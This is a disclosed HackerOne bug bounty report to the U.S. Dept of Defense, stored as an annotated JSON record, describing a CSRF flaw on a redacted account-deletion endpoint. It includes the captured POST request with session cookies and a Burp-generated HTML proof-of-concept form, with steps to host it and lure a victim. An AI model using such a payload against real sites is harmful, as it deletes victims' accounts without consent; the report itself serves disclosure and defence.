{
    "reported_to": "U.S. Dept Of Defense",
    "reported_by": "nightm4re ",
    "title": "CSRF to delete accounts [HtUS]",
    "content": "\nHello,\nI Have an endpoint in \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588that's vulerable to CSRF which lead to delete a victim's account\nSteps to reproduce:\nNevgaite to \u2588\u2588\u2588Create an account\nClick on your profile\nYou will see DELETE ACCOUNT button\nClick on it and type YES in the input\nMake sure your burpsuite is on and click delete account button\nCode 681 Bytes\n1POST /users/deleteAccount HTTP/1.1\n2Host: \u2588\u2588\u2588\u2588\u2588\u2588\n3Cookie: _ga=GA1.2.984523169.1657131465; _gid=GA1.2.2029769492.1657131465; session=eyJwYXNzcG9ydCI6eyJ1c2VyIjoibmlnaHRtNHJlQHdlYXJlaGFja2Vyb25lLmNvbSJ9fQ==; session.sig=S8rkHNPfoRIIU66VUCbDCaV_Kb4; _ga_FCSTM1E00P=GS1.1.1657145372.2.1.1657145650.0\n4User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\n5Accept: */*\n6Accept-Language: en-US,en;q=0.5\n7Accept-Encoding: gzip, deflate\n8X-Requested-With: XMLHttpRequest\n9Origin: https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n10Referer: https://\u2588\u2588\u2588\u2588\u2588/users/deleteAccount\n11Sec-Fetch-Dest: empty\n12Sec-Fetch-Mode: cors\n13Sec-Fetch-Site: same-origin\n14Content-Length: 0\n15Te: trailers\n16Connection: close\nCapture the request and click right > Engagement Tools > Generate CSRF POC\nCode 274 Bytes\n1<html>\n2  <!-- CSRF PoC - generated by Burp Suite Professional -->\n3  <body>\n4  <script>history.pushState('', '', '/')</script>\n5    <form action=\"https://\u2588\u2588\u2588\u2588/users/deleteAccount\" method=\"POST\">\n6      <input type=\"submit\" value=\"Submit request\" />\n7    </form>\n8  </body>\n9</html>\nCopy the HTML Code and put to your server and send the page to the victim\nOnce the vicitm opnening the page his account will be deleted\nImpact\nAn attacker can delete vicitm's account\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Cross-Site Request Forgery (CSRF)"
    ],
    "screenshots": {},
    "disclosed_date": 1684178160,
    "report_url": "https://hackerone.com/reports/1629828",
    "is_multi_component": true,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Navigate to the target website and create an account."
        ],
        [
            2,
            "Log in to the account, go to the profile page, and click the 'DELETE ACCOUNT' button."
        ],
        [
            3,
            "Type 'YES' in the input field and click the delete account button while Burp Suite is intercepting the request."
        ],
        [
            4,
            "Capture the request in Burp Suite, right-click, select 'Engagement Tools' > 'Generate CSRF PoC'."
        ],
        [
            5,
            "Copy the generated HTML code, host it on a server, and send the link to the victim."
        ],
        [
            6,
            "When the victim opens the link, their account will be deleted without their consent."
        ]
    ],
    "vuln_description": "The vulnerability is a CSRF (Cross-Site Request Forgery) flaw that allows an attacker to delete a victim's account without their consent. The attack exploits the lack of anti-CSRF tokens or other protections on the account deletion endpoint.",
    "reason": "The vulnerability is straightforward to discover as it involves a common CSRF attack pattern. The steps are linear and do not require complex interactions or deep understanding of the application's logic. The use of Burp Suite to generate the CSRF PoC is a standard practice in testing for such vulnerabilities.",
    "new_complexity": "LOW",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}